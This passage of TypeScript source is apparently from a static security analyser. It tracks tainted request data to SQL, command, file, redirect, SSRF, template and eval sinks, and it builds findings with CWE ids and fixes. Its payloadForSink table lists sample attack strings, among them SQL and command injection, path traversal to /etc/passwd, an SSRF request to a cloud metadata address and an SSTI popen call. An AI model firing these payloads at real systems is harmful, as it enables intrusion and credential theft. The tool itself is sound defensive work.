  const pySources = code.matchAll(/(?:^|\n)\s*(\w+)\s*=\s*(?:request\.(?:args|form|json|files|values|GET|POST|query_params|path_params)\.get|await\s+request\.json|request\.get_json)\s*\(/g);
  for (const m of pySources) untrustedVars.push(m[1]);
  const fastApiParams = code.matchAll(/@(?:app|router)\.(?:get|post|put|patch|delete)[\s\S]{0,200}?def\s+\w+\s*\(([^)]*)\)/g);
  for (const m of fastApiParams) {
    for (const p of splitArgs(m[1])) {
      if (!/^(request|self|db|session|current_user)\b/i.test(p)) untrustedVars.push(cleanVarName(p));
    }
  }

  if (untrustedVars.length) {
    boundaries.push({
      name: 'ExternalInput',
      trusted: false,
      vars: [...new Set(untrustedVars)],
      sanitizers: [],
      description: 'User-controlled data from HTTP request (req.body/query/params/headers)',
    });
  }

  // Detect active sanitizers in code
  const sanitizers: string[] = [];
  if (HTML_SANITIZERS.test(code)) sanitizers.push('HTML-escape');
  if (SQL_PARAMETERIZED.test(code)) sanitizers.push('SQL-parameterize');
  if (URL_SANITIZERS.test(code)) sanitizers.push('URL-encode');
  if (CRLF_SANITIZERS.test(code)) sanitizers.push('CRLF-strip');
  if (PATH_SAFE.test(code) || PY_PATH_SANITIZERS.test(code)) sanitizers.push('path-canonicalization');
  if (SCHEMA_SANITIZERS.test(code)) sanitizers.push('schema-validation');
  if (TIMING_SAFE.test(code)) sanitizers.push('timing-safe-compare');

  if (sanitizers.length) {
    boundaries.push({
      name: 'SanitizationLayer',
      trusted: true,
      vars: [],
      sanitizers,
      description: `Active sanitizers detected: ${sanitizers.join(', ')}`,
    });
  }

  return boundaries;
}

// ─── Stage 5: Interprocedural Taint (4-hop, async-aware) ─────────────────────
interface TaintVar { line: number; source: string; hops: number }

function runInterproceduralTaint(
  lines: LineInfo[],
  callGraph: CallGraph,
  ssa: SSAForm,
  frameworkCtx: FrameworkContext,
  constants: Map<string, { line: number; value: string }>,
  deadLines: Set<number>,
  constructorFields = buildConstructorFieldSummaries(lines),
): Map<string, TaintVar> {
  const tainted = new Map<string, TaintVar>();

  // Initial sources
  const sourceRe = [
    /(?:const|let|var)\s+(?:\{([^}]+)\}|(\w+))\s*=\s*req\.(?:query|params|body|headers)/,
    /(?:const|let|var)\s+(\w+)\s*=\s*(?:request|req)\.nextUrl\.searchParams\.get\(/,
    /(?:const|let|var)\s*\{([^}]+)\}\s*=\s*(?:await\s+)?params/,
    /formData\.get\s*\(\s*['"](\w+)['"]/,
    /event\.(?:queryStringParameters|body|pathParameters)\.(\w+)/,
    /searchParams\.get\s*\(\s*['"](\w+)['"]/,
    /(?:const|let|var)\s+(\w+)\s*=\s*(?:ctx|context|c)\.(?:query|params|body|request\.body)\.?(\w+)?/,
    /(?:const|let|var)\s+(\w+)\s*=\s*args\.(\w+)/,
    /(?:const|let|var)\s+(\w+)\s*=\s*input\.(\w+)/,
    /^\s*(\w+)\s*=\s*request\.(?:args|form|json|files|values|GET|POST|query_params|path_params)\.get\s*\(/,
    /^\s*(\w+)\s*=\s*request\.(?:get_json|json)\s*\(/,
    /^\s*(\w+)\s*=\s*(?:await\s+)?request\.(?:json|form)\s*\(/,
    /^\s*(\w+)\s*=\s*self\.kwargs\.get\s*\(/,
    /os\.environ\.get\s*\(\s*['"](\w+)['"]/,
  ];

  for (const { index, raw } of lines) {
    if (deadLines.has(index + 1)) continue;
    for (const re of sourceRe) {
      const m = re.exec(raw);
      if (!m) continue;
      const vars = (m[1] && m[1].includes(','))
        ? m[1].split(',').map(s => s.trim().replace(/[=:].*/,'').trim()).filter(Boolean)
        : [(m[1] ?? m[2] ?? '').trim()].filter(Boolean);
      for (const v of vars) {
        if (v) tainted.set(v, { line: index + 1, source: 'external-input', hops: 0 });
      }
    }

    if (frameworkCtx.fastapi && /@(?:app|router)\.(?:get|post|put|patch|delete)/.test(lines[Math.max(0, index - 1)]?.raw ?? '')) {
      const def = raw.match(/def\s+\w+\s*\(([^)]*)\)/);
      if (def) {
        for (const p of splitArgs(def[1]).map(cleanVarName)) {
          if (p && !/^(request|self|db|session|current_user)$/i.test(p)) {
            tainted.set(p, { line: index + 1, source: 'fastapi-route-param', hops: 0 });
          }
        }
      }
    }
  }

  // Propagate (4 hops: alias, template, concat, function call, await, destructure)
  for (let hop = 0; hop < 4; hop++) {
    let changed = false;
    for (const { index, raw } of lines) {
      const ln = index + 1;
      if (deadLines.has(ln)) continue;

      // Alias: const b = a
      const alias = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*(?:await\s+)?([\w.]+)\s*[;,\n]/);
      if (alias?.[1] && alias?.[2] && taintHas(tainted, alias[2]) && !tainted.has(alias[1]) && !constants.has(alias[1])) {
        const targetVersion = ssa.versions.get(alias[1])?.find(v => v.line === ln);
        if (targetVersion && targetVersion.sanitizedFor.length) continue;
        tainted.set(alias[1], { line: ln, source: alias[2], hops: (tainted.get(alias[2])?.hops ?? 0) + 1 });
        changed = true;
      }

      // Template: const b = `...${a}...`
      const tmpl = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*`[^`]*\$\{(\w+)\}/);
      if (tmpl?.[1] && tmpl?.[2] && tainted.has(tmpl[2]) && !tainted.has(tmpl[1])) {
        const targetVersion = ssa.versions.get(tmpl[1])?.find(v => v.line === ln);
        if (targetVersion && targetVersion.sanitizedFor.length) continue;
        tainted.set(tmpl[1], { line: ln, source: tmpl[2], hops: (tainted.get(tmpl[2])?.hops ?? 0) + 1 });
        changed = true;
      }

      const fieldAssign = raw.match(/^\s*([\w.]+)\s*=\s*(.+)$/);
      if (fieldAssign?.[1] && fieldAssign?.[2] && fieldAssign[1].includes('.') && !detectSanitizers(fieldAssign[2]).length) {
        const dep = [...tainted.keys()].find(v => new RegExp(`\\b${v.replace('.', '\\.')}\\b`).test(fieldAssign[2]));
        if (dep && !tainted.has(fieldAssign[1])) {
          tainted.set(fieldAssign[1], { line: ln, source: dep, hops: (tainted.get(dep)?.hops ?? 0) + 1 });
          changed = true;
        }
      }

      // Concat: const b = a + x  or const b = x + a
      for (const re of [/(?:const|let|var)\s+(\w+)\s*=\s*(\w+)\s*\+/, /(?:const|let|var)\s+(\w+)\s*=\s*\S+\s*\+\s*(\w+)/]) {
        const m = raw.match(re);
        if (m?.[1] && m?.[2] && tainted.has(m[2]) && !tainted.has(m[1])) {
          const targetVersion = ssa.versions.get(m[1])?.find(v => v.line === ln);
          if (targetVersion && targetVersion.sanitizedFor.length) continue;
          tainted.set(m[1], { line: ln, source: m[2], hops: (tainted.get(m[2])?.hops ?? 0) + 1 });
          changed = true;
        }
      }

      const pyAssign = raw.match(/^\s*(\w+)\s*=\s*(.+)$/);
      if (pyAssign?.[1] && pyAssign?.[2] && !tainted.has(pyAssign[1]) && !detectSanitizers(pyAssign[2]).length) {
        const dep = [...tainted.keys()].find(v => new RegExp(`\\b${v}\\b`).test(pyAssign[2]));
        if (dep) {
          tainted.set(pyAssign[1], { line: ln, source: dep, hops: (tainted.get(dep)?.hops ?? 0) + 1 });
          changed = true;
        }
      }

      const fieldRead = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*([\w.]+)|^\s*(\w+)\s*=\s*([\w.]+)$/);
      if (fieldRead) {
        const target = fieldRead[1] ?? fieldRead[3];
        const source = fieldRead[2] ?? fieldRead[4];
        if (target && source?.includes('.') && taintHas(tainted, source) && !tainted.has(target) && !constants.has(target)) {
          const sourceInfo = tainted.get(source) ?? tainted.get(source.split('.')[0]);
          tainted.set(target, { line: ln, source, hops: (sourceInfo?.hops ?? 0) + 1 });
          changed = true;
        }
      }

      // Destructure from tainted object: const { x } = taintedObj
      const destr = raw.match(/(?:const|let|var)\s*\{([^}]+)\}\s*=\s*(\w+)/);
      if (destr?.[1] && destr?.[2] && tainted.has(destr[2])) {
        for (const part of destr[1].split(',')) {
          const v = part.trim().replace(/[=:].*/,'').trim();
          if (v && !tainted.has(v)) {
            tainted.set(v, { line: ln, source: destr[2], hops: (tainted.get(destr[2])?.hops ?? 0) + 1 });
            changed = true;
          }
        }
      }

      // Function return propagation via call graph
      const callM = raw.match(/(?:const|let|var)\s+(\w+)\s*=\s*(?:await\s+)?(\w+)\s*\(([^)]*)\)/);
      if (callM?.[1] && callM?.[2]) {
        const result  = callM[1];
        const fnName  = callM[2];
        const argList = (callM[3] ?? '').split(',').map(s => s.trim()).filter(Boolean);
        const targetVersion = ssa.versions.get(result)?.find(v => v.line === ln);
        if (targetVersion && targetVersion.sanitizedFor.length) continue;
        const taintedArgs = argList.filter(a => taintHas(tainted, a));
        if (taintedArgs.length > 0 && !tainted.has(result)) {
          const node = callGraph.nodes.get(fnName);
          const propagates = !node || node.params.some((param, idx) => {
            const actualArg = argList[idx];
            if (!actualArg || !taintHas(tainted, actualArg)) return false;
            const body = lines.slice(node.line - 1, Math.min(lines.length, node.line + 60)).map(l => l.raw).join('\n');
            return new RegExp(`return\\s+[\\s\\S]{0,160}\\b${param}\\b`).test(body) ||
              new RegExp(`(?:query|execute|exec|render|fetch|redirect|open|readFile)[\\s\\S]{0,120}\\b${param}\\b`).test(body);
          });
          if (propagates) {
            tainted.set(result, { line: ln, source: `${fnName}(${taintedArgs.join(',')})`, hops: 2 });
            changed = true;
          }
        }
      }

      const pyCallM = raw.match(/^\s*(\w+)\s*=\s*(\w+)\s*\(([^)]*)\)/);
      if (pyCallM?.[1] && pyCallM?.[2]) {
        const result = pyCallM[1];
        const fnName = pyCallM[2];
        const argList = pyCallM[3].split(',').map(s => s.trim()).filter(Boolean);
        const fieldSummary = constructorFields.get(fnName) ?? [];
        if (fieldSummary.length && !constants.has(result)) {
          for (const { field, index: paramIndex } of fieldSummary) {
            const actualArg = argList[Math.max(0, paramIndex)];
            if (actualArg && taintHas(tainted, actualArg)) {
              tainted.set(`${result}.${field}`, { line: ln, source: actualArg, hops: (tainted.get(actualArg)?.hops ?? 0) + 1 });
              changed = true;
            }
          }
        }
        if (argList.some(a => taintHas(tainted, a)) && !tainted.has(result) && !detectSanitizers(raw).length && !constants.has(result)) {
          const node = callGraph.nodes.get(fnName);
          const body = node ? lines.slice(node.line - 1, Math.min(lines.length, node.line + 60)).map(l => l.raw).join('\n') : '';
          if (!node || /return\s+/.test(body)) {
            tainted.set(result, { line: ln, source: `${fnName}(${argList.filter(a => taintHas(tainted, a)).join(',')})`, hops: 2 });
            changed = true;
          }
        }
      }

      const callbackM = raw.match(/([\w.]+)\.(?:map|forEach|filter|then|catch|finally)\s*\(\s*(?:async\s*)?\(?(\w+)\)?\s*=>\s*(.+)\)?/);
      if (callbackM?.[1] && callbackM?.[2] && !tainted.has(callbackM[2]) && taintHas(tainted, callbackM[1])) {
        tainted.set(callbackM[2], { line: ln, source: `${callbackM[1]} callback`, hops: (tainted.get(callbackM[1])?.hops ?? 0) + 1 });
        changed = true;
      }

      const cbCall = raw.match(/\(([^)]*)\)\s*=>\s*([\w.]+)\s*\(([^)]*)\)/);
      if (cbCall?.[1] && cbCall?.[3]) {
        for (const param of splitArgs(cbCall[1])) {
          if (cbCall[3].includes(param) && [...tainted.keys()].some(v => raw.includes(v))) {
            tainted.set(param, { line: ln, source: 'callback-param', hops: 2 });
            changed = true;
          }
        }
      }

      // Promise chain: .then(x => sink(x)) — if .then arg is tainted
      const promM = raw.match(/\.then\s*\(\s*(?:async\s*)?\(?(\w+)\)?\s*=>/);
      if (promM?.[1] && !tainted.has(promM[1])) {
        // look back for the promise variable
        const prev = lines.slice(Math.max(0, index - 3), index).map(l => l.raw).join('\n');
        const promVar = prev.match(/(\w+)\.then\s*\(/) || raw.match(/^(\w+)\.then\s*\(/);
        if (promVar?.[1] && tainted.has(promVar[1])) {
          tainted.set(promM[1], { line: ln, source: promVar[1] + '.then()', hops: 2 });
          changed = true;
        }
      }
    }
    if (!changed) break;
  }

  return tainted;
}

interface PathFact {
  line: number;
  variable: string | null;
  sanitizers: SanitizerKind[];
  condition: string;
  protectsUntil: number;
}

function buildPathFacts(lines: LineInfo[]): PathFact[] {
  const facts: PathFact[] = [];
  for (const { index, raw, indent } of lines) {
    const line = index + 1;
    const guard = raw.match(/if\s*\(([^)]*(?:validate|isValid|allow|schema|typeof|instanceof|includes)[^)]*)\)\s*(?:return|throw|next|res\.status)|if\s+(.+?(?: in |isinstance|validate|allowed|cleaned_data).+):/i);
    const directSanitizer = detectSanitizers(raw);
    if (!guard && !directSanitizer.length) continue;
    const condition = (guard?.[1] ?? guard?.[2] ?? raw.trim()).slice(0, 120);
    const variable = (condition.match(/\b([A-Za-z_]\w*)\b/) ?? [])[1] ?? null;
    const protectsUntil = lines.find(l => l.index > index && l.indent < indent && l.trimmed)?.index ?? Math.min(lines.length - 1, index + 80);
    facts.push({ line, variable, sanitizers: directSanitizer.length ? directSanitizer : ['schema'], condition, protectsUntil: protectsUntil + 1 });
  }
  return facts;
}

function pathSanitizersFor(line: number, variable: string, facts: PathFact[]): SanitizerKind[] {
  return [...new Set(facts
    .filter(f => f.line < line && f.protectsUntil >= line && (!f.variable || f.variable === variable || f.condition.includes(variable)))
    .flatMap(f => f.sanitizers))];
}

function traceSSA(variable: string, ssa: SSAForm): string[] {
  return (ssa.versions.get(variable) ?? []).slice(-4).map(v => `${v.ssaName}@L${v.line} = ${v.expression.slice(0, 80)}`);
}

function findTaintedVarsOnLine(raw: string, tainted: Map<string, TaintVar>): string[] {
  return [...tainted.keys()].filter(v => {
    const escaped = v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const base = v.split('.')[0];
    return new RegExp(`\\b${escaped}\\b`).test(raw) || raw.includes(`${v}.`) || (!!base && raw.includes(`${base}.`) && tainted.has(base));
  });
}

function languageCweForSink(language: string, sink: SinkKind): { id: string; name: string } {
  if (language === 'python' && sink === 'ssti') return { id: 'CWE-94', name: 'Python SSTI / Code Injection' };
  if (language === 'python' && sink === 'deserialization') return { id: 'CWE-502', name: 'Python Unsafe Deserialization' };
  if (language === 'php' && sink === 'deserialization') return { id: 'CWE-502', name: 'PHP Object Injection' };
  if (language === 'java' && sink === 'deserialization') return { id: 'CWE-502', name: 'Java Unsafe Deserialization' };
  return CWE_BY_SINK[sink];
}

function payloadForSink(sink: SinkKind): string {
  const payloads: Record<SinkKind, string> = {
    sql: "' OR '1'='1'--",
    xss: '<img src=x onerror=alert(1)>',
    cmd: '"; id; #',
    path: '../../etc/passwd',
    redirect: 'https://evil.example/phish',
    ssrf: 'http://169.254.169.254/latest/meta-data/',
    deserialization: 'crafted serialized object payload',
    ssti: '{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}',
    eval: 'process.mainModule.require("child_process").execSync("id")',
    header: 'value%0d%0aSet-Cookie:%20admin=true',
  };
  return payloads[sink];
}

function fixForSink(sink: SinkKind, v: string, language: string): string {
  if (sink === 'sql') return language === 'python' ? 'Use cursor.execute("... WHERE id = %s", (value,)) or ORM parameter binding.' : 'Use parameterized queries/placeholders; never concatenate request data into SQL.';
  if (sink === 'cmd') return 'Avoid shell execution. Pass a fixed executable and validated arguments array with shell disabled.';
  if (sink === 'path') return 'Resolve/canonicalize the final path and verify it remains inside an allowed base directory.';
  if (sink === 'redirect') return 'Allowlist relative paths or approved hosts before redirecting.';
  if (sink === 'ssrf') return 'Route outbound requests through an egress allowlist/proxy and reject private/metadata IP ranges after DNS resolution.';
  if (sink === 'deserialization') return 'Use a safe data format such as JSON; never deserialize attacker-controlled native objects.';
  if (sink === 'ssti') return `Render fixed templates and pass ${v} as data after escaping, never as template source.`;
  if (sink === 'eval') return 'Remove dynamic code execution; use a parser or fixed command dispatch table.';
  if (sink === 'header') return 'Reject CR/LF and use framework header APIs with validated values.';
  return 'Use context-appropriate output encoding or safe DOM APIs.';
}

function impactForSink(sink: SinkKind): string {
  if (sink === 'sql') return 'Data exfiltration, authentication bypass, data modification';
  if (sink === 'cmd' || sink === 'eval' || sink === 'ssti' || sink === 'deserialization') return 'Remote code execution';
  if (sink === 'ssrf') return 'Internal service access or cloud credential theft';
  if (sink === 'path') return 'Arbitrary file read/write';
  if (sink === 'redirect') return 'Phishing and OAuth token theft';
  if (sink === 'header') return 'Response splitting and cookie injection';
  return 'Browser-side code execution';
}

function sinkArgumentText(raw: string, sink: SinkKind): string {
  const patterns: Record<SinkKind, RegExp> = {
    sql: /(?:query|execute|run|raw|text)\s*\((.*)\)/,
    xss: /(?:innerHTML|outerHTML|write|insertAdjacentHTML)[^=]*(?:=|\()(.*)/,
    cmd: /(?:exec|execSync|spawn|spawnSync|os\.system|os\.popen|subprocess\.\w+)\s*\((.*)\)/,
    path: /(?:readFile|readFileSync|createReadStream|writeFile|open|send_file|FileResponse|Path|join)\s*\((.*)\)/,
    redirect: /(?:redirect|HttpResponseRedirect|RedirectResponse)\s*\((.*)\)/,
    ssrf: /(?:fetch|axios(?:\.get|\.post)?|got|request|requests\.\w+|httpx\.\w+|urlopen)\s*\((.*)\)/,
    deserialization: /(?:loads?|load)\s*\((.*)\)/,
    ssti: /(?:Template|render_template_string)\s*\((.*)\)/,
    eval: /(?:eval|exec|Function|run\w*)\s*\((.*)\)/,
    header: /(?:setHeader|headers\s*\[|response\[[^\]]+\]\s*=)\s*\(?(.*)/,
  };
  return raw.match(patterns[sink])?.[1] ?? raw;
}

function chooseRelevantTaintedVars(raw: string, sink: SinkKind, taintedHere: string[]): string[] {
  const argText = sinkArgumentText(raw, sink);
  const inArgs = taintedHere.filter(v => new RegExp(`\\b${v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(argText));
  return (inArgs.length ? inArgs : taintedHere).sort((a, b) => b.length - a.length);
}

function makeDataflowFinding(
  sink: SinkKind,
  ln: number,
  taintedVar: string,
  tainted: Map<string, TaintVar>,
  ssa: SSAForm,
  pathCondition: string[],
  sanitizerEvidence: string | null,
  language: string,
  framework?: string,
): PipelineFinding {
  const tv = tainted.get(taintedVar);
  const cwe = languageCweForSink(language, sink);
  const sinkLabel: Record<SinkKind, string> = {
    sql: 'SQL query', xss: 'HTML/DOM sink', cmd: 'OS command', path: 'filesystem path',
    redirect: 'redirect target', ssrf: 'server-side HTTP request', deserialization: 'deserializer',
    ssti: 'template renderer', eval: 'dynamic code execution', header: 'HTTP header',
  };
  const severity: PipelineFinding['severity'] = ['sql', 'cmd', 'xss', 'path', 'deserialization', 'eval', 'ssti', 'ssrf'].includes(sink) ? 'high' : 'medium';
  const reachability = Math.max(45, 95 - (tv?.hops ?? 0) * 8 - pathCondition.length * 5);
  const exploitabilityBase: Record<SinkKind, number> = { sql: 88, xss: 82, cmd: 95, path: 72, redirect: 68, ssrf: 86, deserialization: 96, ssti: 94, eval: 96, header: 70 };
  const exploitability = Math.max(35, exploitabilityBase[sink] - (sanitizerEvidence ? 35 : 0) - pathCondition.length * 4);
  const confidence = Math.max(45, Math.min(96, 70 + (tv ? 15 : 0) - (tv?.hops ?? 0) * 4 - (sanitizerEvidence ? 25 : 0)));
  const blastRadius: PipelineFinding['blastRadius'] = ['cmd', 'deserialization', 'ssti', 'eval', 'ssrf'].includes(sink) ? 'critical' : severity === 'high' ? 'high' : 'medium';
  const riskScore = Math.round(exploitability * 0.45 + reachability * 0.35 + confidence * 0.20);

  return {
    id: `${sink}-taint-${ln}-${taintedVar}`,
    title: `${cwe.id} ${cwe.name} - tainted ${taintedVar} reaches ${sinkLabel[sink]}`,
    explanation: `Variable '${taintedVar}' from ${tv?.source ?? 'external input'} at L${tv?.line ?? '?'} reaches ${sinkLabel[sink]} at L${ln}. ${sanitizerEvidence ? `A sanitizer was detected (${sanitizerEvidence}), so exploitability is reduced instead of treated as a raw pattern hit.` : 'No context-appropriate sanitizer or allowlist was found on the feasible path.'}`,
    exploitChain: `${tv?.source ?? 'external input'} -> ${taintedVar} -> L${ln} ${sinkLabel[sink]}`,
    exploitPayload: payloadForSink(sink),
    fix: fixForSink(sink, taintedVar, language),
    severity,
    category: 'security',
    line: ln,
    confidence,
    exploitability,
    reachability,
    blastRadius,
    framework,
    cwe: cwe.id,
    cweName: cwe.name,
    language,
    riskScore,
    ssaTrace: traceSSA(taintedVar, ssa),
    pathCondition,
    sanitizerEvidence,
    trustBoundary: { source: `${taintedVar} (untrusted)`, sanitizer: sanitizerEvidence, bypass: sanitizerEvidence ? 'context mismatch or incomplete sanitizer' : null, sink: `${sinkLabel[sink]} at L${ln}` },
    attackChain: { entry: tv?.source ?? 'HTTP request', hops: traceSSA(taintedVar, ssa), sink: sinkLabel[sink], impact: impactForSink(sink) },
  };
}

function makeArgumentInjectionFinding(
  ln: number,
  taintedVar: string,
  tainted: Map<string, TaintVar>,
  ssa: SSAForm,
  framework?: string,
): PipelineFinding {
  const tv = tainted.get(taintedVar);
  return {
    id: `arg-injection-${ln}-${taintedVar}`,
    title: `CWE-88 Argument Injection - tainted ${taintedVar} reaches subprocess argv`,
    explanation: `Variable '${taintedVar}' reaches a subprocess argument array at L${ln}. Because shell=True is absent, shell metacharacters are not interpreted, so this is not classic OS command injection. The remaining risk is binary-specific argument injection or misuse of utilities such as ping/curl/tar.`,
    exploitChain: `${tv?.source ?? 'external input'} -> ${taintedVar} -> subprocess argv at L${ln}`,
    exploitPayload: '--help or binary-specific option payload',
    fix: 'Validate argv values against a strict allowlist for the specific binary, reject leading option markers where appropriate, and consider inserting "--" before user-controlled operands.',
    severity: 'medium',
    category: 'security',
    line: ln,
    confidence: 62,
    exploitability: 45,
    reachability: Math.max(45, 90 - (tv?.hops ?? 0) * 8),
    blastRadius: 'medium',
    framework,
    cwe: 'CWE-88',
    cweName: 'Argument Injection or Modification',
    language: 'python',
    riskScore: 55,
    ssaTrace: traceSSA(taintedVar, ssa),
    pathCondition: [],
    sanitizerEvidence: 'subprocess argv array without shell=True',
    trustBoundary: { source: `${taintedVar} (untrusted)`, sanitizer: 'argv array / no shell expansion', bypass: 'binary-specific option parsing', sink: `subprocess argv at L${ln}` },
    attackChain: { entry: tv?.source ?? 'HTTP request', hops: traceSSA(taintedVar, ssa), sink: 'child process argv', impact: 'Option injection or unintended binary behavior' },
  };
}

function analyzeTaintSinks(
  lines: LineInfo[],
  tainted: Map<string, TaintVar>,
  ssa: SSAForm,
  pathFacts: PathFact[],
  language: string,
  frameworkCtx: FrameworkContext,
  deadLines: Set<number>,
): PipelineFinding[] {
  const findings: PipelineFinding[] = [];
  const framework = frameworkCtx.fastapi ? 'FastAPI' : frameworkCtx.flask ? 'Flask' : frameworkCtx.django ? 'Django' : frameworkCtx.express ? 'Express' : undefined;
  const sinkPatterns: Array<{ kind: SinkKind; re: RegExp; safe: RegExp }> = [
    { kind: 'sql', re: /(?:db|pool|client)\.(?:query|execute|run)\s*\(|cursor\.execute\s*\(|\.raw\s*\(|text\s*\(/, safe: SQL_PARAMETERIZED },
    { kind: 'xss', re: /(?:res\.send|res\.write|Response|HttpResponse|HTMLResponse|render_template_string|Markup|make_response|return\s+f?['"`][\s\S]*<[^>]+>)/, safe: new RegExp(`${HTML_SANITIZERS.source}|${PY_HTML_SANITIZERS.source}|textContent|render_template\\s*\\(`) },
    { kind: 'cmd', re: /(?:exec|execSync|spawn|spawnSync|os\.system|os\.popen|subprocess\.\w+)\s*\(/, safe: new RegExp(`${CMD_SAFE.source}|${PY_CMD_SAFE.source}`) },
    { kind: 'path', re: /(?:readFile|readFileSync|createReadStream|writeFile|open|send_file|FileResponse|Path|os\.path\.join|path\.join)\s*\(/, safe: new RegExp(`${PATH_SAFE.source}|${PY_PATH_SANITIZERS.source}`) },
    { kind: 'redirect', re: /(?:res\.redirect|redirect|HttpResponseRedirect|RedirectResponse)\s*\(/, safe: new RegExp(`${REDIRECT_SAFE.source}|${PY_URL_SANITIZERS.source}`) },
    { kind: 'ssrf', re: /(?:fetch|axios(?:\.get|\.post)?|got|request|requests\.(?:get|post)|httpx\.(?:get|post)|urllib\.request\.urlopen)\s*\(/, safe: REDIRECT_SAFE },
    { kind: 'deserialization', re: /(?:pickle|marshal)\.loads?\s*\(|yaml\.load\s*\(|ObjectInputStream|unserialize\s*\(/, safe: /yaml\.safe_load|json\.loads|ast\.literal_eval/ },
    { kind: 'ssti', re: /(?:jinja2\.)?Template\s*\(|render_template_string\s*\(|mako\.template\.Template\s*\(/, safe: PY_HTML_SANITIZERS },
    { kind: 'eval', re: /\beval\s*\(|\bexec\s*\(|new Function\s*\(|vm\.run/, safe: /ast\.literal_eval|safeEval/ },
    { kind: 'header', re: /(?:setHeader|headers\s*\[|response\[[^\]]+\]\s*=)/, safe: CRLF_SANITIZERS },
  ];

  for (const { index, raw } of lines) {
    const ln = index + 1;
    if (deadLines.has(ln)) continue;
    const taintedHere = findTaintedVarsOnLine(raw, tainted);
    if (!taintedHere.length) continue;
    const scopeStart = Math.max(1, ...lines
      .slice(0, index + 1)
      .filter(l => /^\s*(?:async\s+)?def\s+\w+\s*\(|\s*function\s+\w+\s*\(/.test(l.raw))
      .map(l => l.index + 1));
    const ctx = lines.slice(Math.max(scopeStart - 1, index - 5), Math.min(lines.length, index + 3)).map(l => l.raw).join('\n');

    for (const sink of sinkPatterns) {
      if (!sink.re.test(raw)) continue;
      for (const v of chooseRelevantTaintedVars(raw, sink.kind, taintedHere)) {
        const ssaVar = nearestSSAInScope(v.split('.')[0], ln, scopeStart, ssa);
        const ssaSan = ssaVar?.sanitizedFor ?? [];
        const dependencySan = ssaVar
          ? [...tainted.keys()]
              .filter(dep => dep !== v && new RegExp(`\\b${dep.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`).test(ssaVar.expression))
              .flatMap(dep => pathSanitizersFor(ln, dep, pathFacts))
          : [];
        const allSan = [...new Set([...pathSanitizersFor(ln, v, pathFacts), ...dependencySan, ...detectSanitizers(ctx), ...ssaSan])];
        const safeByContext = sink.safe.test(ctx) || sanitizerCovers(allSan, sink.kind);
        if (sink.kind === 'cmd' && safeByContext && /subprocess\.\w+\s*\(\s*\[/.test(ctx) && !/shell\s*=\s*True/.test(ctx)) {
          findings.push(makeArgumentInjectionFinding(ln, v, tainted, ssa, framework));
          continue;
        }
        if (safeByContext && sink.kind !== 'ssrf') continue;
        const pathCondition = pathFacts
          .filter(f => f.line < ln && f.protectsUntil >= ln)
          .slice(-3)
          .map(f => `L${f.line}: ${f.condition}`);
        findings.push(makeDataflowFinding(sink.kind, ln, v, tainted, ssa, pathCondition, allSan.length ? allSan.join(', ') : null, language, framework));
      }
      break;
    }
  }

  return findings;
}

// ─── Stage 6: Contextual XSS Analysis ────────────────────────────────────────
function analyzeContextualXss(lines: LineInfo[], tainted: Map<string, TaintVar>, deadLines = new Set<number>()): PipelineFinding[] {
  const findings: PipelineFinding[] = [];
  const safeLines = new Set<number>();

  for (const { index, raw, trimmed } of lines) {
    const ln = index + 1;
    if (deadLines.has(ln)) continue;

    // innerHTML, outerHTML, document.write
    const domM = raw.match(/(?:\.innerHTML|\.outerHTML|document\.write|insertAdjacentHTML\s*\([^,]+,)\s*=?\s*([^;]+)/);
    if (domM) {
      const val = domM[1].trim();
      if (HTML_SANITIZERS.test(val)) { safeLines.add(ln); continue; }
      if ([...tainted.keys()].some(v => val.includes(v))) {
        const ctx = detectXssContext(raw, val);
        findings.push(makeXssFinding(ln, raw, ctx, val, tainted));
      }
    }

    // Template literal HTML sinks
    const tmplMatch = raw.match(/`([^`]*<[a-zA-Z\/?][^`]*\$\{([^}]+)\}[^`]*)`/);
    if (tmplMatch) {
      const interp = tmplMatch[2].trim();
      if (HTML_SANITIZERS.test(interp)) { safeLines.add(ln); continue; }
      if (tainted.has(interp) || tainted.has(interp.split('.')[0])) {
        const ctx = detectXssContext(raw, interp);
        findings.push(makeXssFinding(ln, raw, ctx, interp, tainted));
      }
    }

    // React dangerouslySetInnerHTML
    if (/dangerouslySetInnerHTML/.test(raw)) {
      const htmlM = raw.match(/__html\s*:\s*([^,}]+)/);
      if (htmlM) {
        const val = htmlM[1].trim();
        if (!HTML_SANITIZERS.test(val) && [...tainted.keys()].some(v => val.includes(v))) {
          findings.push(makeXssFinding(ln, raw, 'jsx', val, tainted));
        }
      }
    }

    // JS string context: eval, setTimeout with tainted string
    if (/\beval\s*\(/.test(raw) || /setTimeout\s*\(\s*\w+\s*,/.test(raw)) {
      if ([...tainted.keys()].some(v => raw.includes(v))) {
        const ctx: XssContext = 'inline-js';
        findings.push(makeXssFinding(ln, raw, ctx, 'eval/setTimeout', tainted));
      }
    }

    // CSS injection: style attribute
    if (/style\s*=/.test(raw) && /\$\{/.test(raw)) {
      const interp = (raw.match(/\$\{([^}]+)\}/) ?? [])[1] ?? '';
      if (tainted.has(interp)) {
        findings.push(makeXssFinding(ln, raw, 'css', interp, tainted));
      }
    }

    // URL context: href="${url}" without encoding
    if (/href\s*=\s*`|src\s*=\s*`/.test(raw)) {
      const interp = (raw.match(/\$\{([^}]+)\}/) ?? [])[1] ?? '';
      if (interp && tainted.has(interp) && !URL_SANITIZERS.test(raw)) {
        findings.push(makeXssFinding(ln, raw, 'url', interp, tainted));
      }
    }
  }

  // Deduplicate by line
  const seen = new Set<number>();
  return findings.filter(f => {
    if (!f.line || seen.has(f.line)) return false;
    seen.add(f.line);
    return true;
  });
}

function makeXssFinding(
  ln: number, raw: string, ctx: XssContext,
  interp: string, tainted: Map<string, TaintVar>
): PipelineFinding {
  const tv = tainted.get(interp.split('.')[0]) ?? tainted.get(interp);
  const ctxLabel: Record<XssContext, string> = {
    'html-body':  'HTML body',
    'attribute':  'HTML attribute',
    'js-string':  'JavaScript string',
    'inline-js':  'inline JavaScript',
    'css':        'CSS style',
    'url':        'URL/href attribute',
    'dom-sink':   'DOM sink (innerHTML)',
    'jsx':        'React JSX (dangerouslySetInnerHTML)',
  };

  const fixMap: Record<XssContext, string> = {
    'html-body':  `Use DOMPurify.sanitize(${interp}) or encodeHTML(${interp})`,
